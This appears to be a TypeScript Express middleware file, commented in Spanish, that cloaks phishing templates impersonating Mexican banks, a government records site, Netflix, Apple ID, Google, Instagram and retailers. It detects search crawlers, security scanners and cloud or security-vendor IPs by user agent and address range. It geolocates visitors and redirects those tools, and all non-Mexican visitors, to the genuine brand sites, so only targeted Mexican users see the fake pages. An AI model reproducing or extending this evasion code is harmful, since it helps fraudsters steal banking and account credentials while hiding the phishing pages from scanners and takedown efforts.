import { Request, Response, NextFunction } from "express";

// Lista de user agents de bots conocidos
const BOT_USER_AGENTS = [
  // Crawlers de buscadores
  'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot', 'facebookexternalhit',
  // Herramientas de seguridad
  'virus', 'scanner', 'check', 'security', 'monitor', 'analyzer', 'detector', 'malware',
  // Servicios de análisis
  'wappalyzer', 'builtwith', 'shodan', 'whatweb', 'nikto', 'nmap', 'masscan',
  // Crawlers de redes sociales
  'twitterbot', 'linkedinbot', 'whatsapp', 'telegrambot', 'skypebot',
  // Servicios cloud y VPN conocidos
  'curl', 'wget', 'python-requests', 'postman', 'insomnia', 'httpie',
  // Herramientas de testing
  'selenium', 'phantomjs', 'headlesschrome', 'puppeteer', 'playwright',
  // Proxies y servicios de seguridad
  'cloudflare', 'akamai', 'fastly', 'incapsula', 'sucuri'
];

// IPs y rangos de servicios de seguridad conocidos (básicos)
const SECURITY_SERVICE_IPS = [
  // Cloudflare
  '173.245.48.0/20', '103.21.244.0/22', '103.22.200.0/22', '103.31.4.0/22',
  // Google
  '8.8.8.8', '8.8.4.4', '64.233.160.0/19', '66.249.80.0/20', '72.14.192.0/18',
  // Microsoft
  '40.76.0.0/14', '13.64.0.0/11', '52.224.0.0/11'
];

// URLs de sitios reales para cada template
const REAL_SITE_URLS: { [key: string]: string } = {
  // Bancos mexicanos
  'santander': 'https://www.santander.com.mx/personas',
  'bbva': 'https://www.bbva.mx/',
  'banamex': 'https://www.banamex.com/',
  'bancoppel': 'https://www.bancoppel.com/',
  
  // Promociones bancarias
  'bbva-premios': 'https://www.bbva.mx/personas/promociones.html',
  'banorte-premios': 'https://www.banorte.com/wps/portal/ixe/Home/promociones',
  'santander-premios': 'https://www.santander.com.mx/personas/promociones',
  
  // Gobierno y servicios
  'actas': 'https://www.gob.mx/ActaNacimiento/',
  
  // Entretenimiento y tecnología
  'netflix': 'https://www.netflix.com/mx/',
  'netflix-bbva': 'https://www.netflix.com/mx/',
  'apple': 'https://appleid.apple.com/',
  'apple2': 'https://appleid.apple.com/',
  'spotify': 'https://www.spotify.com/mx/',
  'google': 'https://accounts.google.com/',
  'instagram': 'https://www.instagram.com/',
  
  // Retail y viajes
  'liverpool': 'https://www.liverpool.com.mx/',
  'sixflags': 'https://www.sixflags.com.mx/',
  'latam': 'https://www.latam.com/es_mx/'
};

/**
 * Detecta si la IP pertenece a un servicio de seguridad
 */
function isSecurityServiceIP(ip: string): boolean {
  // Verificar IPs exactas
  if (SECURITY_SERVICE_IPS.includes(ip)) {
    return true;
  }
  
  // Verificar rangos CIDR (implementación básica)
  for (const range of SECURITY_SERVICE_IPS) {
    if (range.includes('/')) {
      // Para simplicidad, solo verificar algunos rangos conocidos
      if (range.startsWith('8.8.') && ip.startsWith('8.8.')) return true;
      if (range.startsWith('64.233.') && ip.startsWith('64.233.')) return true;
      if (range.startsWith('66.249.') && ip.startsWith('66.249.')) return true;
    }
  }
  
  return false;
}

/**
 * Detecta si el user agent pertenece a un bot
 */
function isBotUserAgent(userAgent: string): boolean {
  if (!userAgent) return true; // Sin user agent = sospechoso
  
  const ua = userAgent.toLowerCase();
  
  // Verificar patrones de bots conocidos
  return BOT_USER_AGENTS.some(botPattern => ua.includes(botPattern));
}

/**
 * Obtiene la IP real del cliente considerando proxies
 */
function getClientIP(req: Request): string {
  const forwarded = req.headers['x-forwarded-for'] as string;
  const real = req.headers['x-real-ip'] as string;
  const remoteAddress = req.connection?.remoteAddress || req.socket?.remoteAddress;
  
  if (forwarded) {
    return forwarded.split(',')[0].trim();
  }
  
  return real || remoteAddress || 'unknown';
}

/**
 * Cache simple para almacenar resultados de geolocalización
 */
const geolocationCache = new Map<string, { country: string; timestamp: number }>();
const CACHE_DURATION = 1000 * 60 * 60; // 1 hora

/**
 * Detecta el país de una IP usando un servicio gratuito de geolocalización
 */
async function getCountryFromIP(ip: string): Promise<string> {
  // Verificar cache primero
  const cached = geolocationCache.get(ip);
  if (cached && (Date.now() - cached.timestamp) < CACHE_DURATION) {
    return cached.country;
  }

  // IPs locales o de desarrollo
  if (ip === 'unknown' || ip.startsWith('127.') || ip.startsWith('192.168.') || ip.startsWith('10.') || ip === '::1') {
    console.log(`[GEOLOCATION] IP local detectada: ${ip}, permitiendo acceso`);
    return 'MX'; // Permitir IPs locales para desarrollo
  }

  try {
    // Usar ipapi.co (servicio gratuito sin API key)
    const response = await fetch(`http://ipapi.co/${ip}/country_code/`, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (compatible; GeoChecker/1.0)'
      }
    });

    if (response.ok) {
      const countryCode = await response.text();
      const country = countryCode.trim().toUpperCase();
      
      // Guardar en cache
      geolocationCache.set(ip, { country, timestamp: Date.now() });
      
      console.log(`[GEOLOCATION] IP: ${ip} -> País: ${country}`);
      return country;
    } else {
      console.log(`[GEOLOCATION] Error en respuesta para IP ${ip}: ${response.status}`);
      return 'UNKNOWN';
    }
  } catch (error) {
    console.log(`[GEOLOCATION] Error detectando país para IP ${ip}:`, (error as Error).message);
    return 'UNKNOWN';
  }
}

/**
 * Middleware de cloaking que detecta bots y valida geolocalización
 */
export async function cloakingMiddleware(req: Request, res: Response, next: NextFunction) {
  // Verificar estado del cloaking desde variable global
  const getCloakingStatus = (global as any).getCloakingStatus;
  
  // Si el cloaking está desactivado, permitir acceso directo
  if (!getCloakingStatus || !getCloakingStatus()) {
    console.log(`[CLOAKING] Sistema DESACTIVADO - Permitiendo acceso directo`);
    next();
    return;
  }
  const userAgent = req.headers['user-agent'] || '';
  const clientIP = getClientIP(req);
  const templateName = req.params.templateName || '';
  const path = req.path;
  
  // NO aplicar cloaking a rutas de desarrollo, assets, o APIs
  if (path.startsWith('/api/') || 
      path.startsWith('/@vite/') || 
      path.startsWith('/src/') || 
      path.startsWith('/node_modules/') ||
      path.includes('.js') || 
      path.includes('.css') || 
      path.includes('.ts') || 
      path.includes('.tsx') || 
      path.includes('.map') ||
      path.includes('.svg') ||
      path.includes('.png') ||
      path.includes('.jpg') ||
      path.includes('.ico')) {
    return next();
  }
  
  // Log para debugging (remover en producción)
  console.log(`[CLOAKING] IP: ${clientIP}, UA: ${userAgent.substring(0, 100)}...`);
  
  // 1. Detectar si es un bot (primera línea de defensa)
  const isBot = isBotUserAgent(userAgent) || isSecurityServiceIP(clientIP);
  
  if (isBot) {
    // Obtener URL del sitio real
    let realUrl = REAL_SITE_URLS[templateName];
    
    // Si no hay URL específica, usar una genérica
    if (!realUrl) {
      realUrl = 'https://www.google.com/search?q=' + encodeURIComponent(templateName);
    }
    
    console.log(`[CLOAKING] Bot detected! Redirecting to: ${realUrl}`);
    
    // Redirigir al sitio real
    res.redirect(302, realUrl);
    return;
  }

  // 2. Verificar geolocalización (segunda línea de defensa)
  try {
    const countryCode = await getCountryFromIP(clientIP);
    
    // Permitir solo IPs de México
    if (countryCode !== 'MX') {
      // Obtener URL del sitio real para redirección
      let realUrl = REAL_SITE_URLS[templateName];
      
      // Si no hay URL específica, usar una genérica
      if (!realUrl) {
        realUrl = 'https://www.google.com/search?q=' + encodeURIComponent(templateName);
      }
      
      console.log(`[CLOAKING] Non-Mexico IP detected! Country: ${countryCode}, IP: ${clientIP}, Redirecting to: ${realUrl}`);
      
      // Redirigir al sitio real
      res.redirect(302, realUrl);
      return;
    }
    
    // IP de México y no es bot, permitir acceso
    console.log(`[CLOAKING] Mexico IP confirmed (${countryCode}), allowing access to template: ${templateName}`);
    next();
    
  } catch (error) {
    // Si hay error en geolocalización, por seguridad redirigir
    console.log(`[CLOAKING] Geolocation error, redirecting for safety:`, (error as Error).message);
    
    let realUrl = REAL_SITE_URLS[templateName] || 'https://www.google.com/';
    res.redirect(302, realUrl);
    return;
  }
}

/**
 * Middleware específico para rutas de templates
 */
export function templateCloakingMiddleware(req: Request, res: Response, next: NextFunction) {
  // Extraer el nombre del template de la URL /template/:templateName
  const path = req.path;
  const templateMatch = path.match(/\/template\/([^/?]+)/);
  
  if (templateMatch) {
    req.params.templateName = templateMatch[1];
  }
  
  // Llamar al middleware async con manejo de errores
  cloakingMiddleware(req, res, next).catch((error) => {
    console.error('[CLOAKING] Error in middleware:', error);
    // En caso de error, redirigir por seguridad
    const templateName = req.params.templateName || '';
    const realUrl = REAL_SITE_URLS[templateName] || 'https://www.google.com/';
    res.redirect(302, realUrl);
  });
}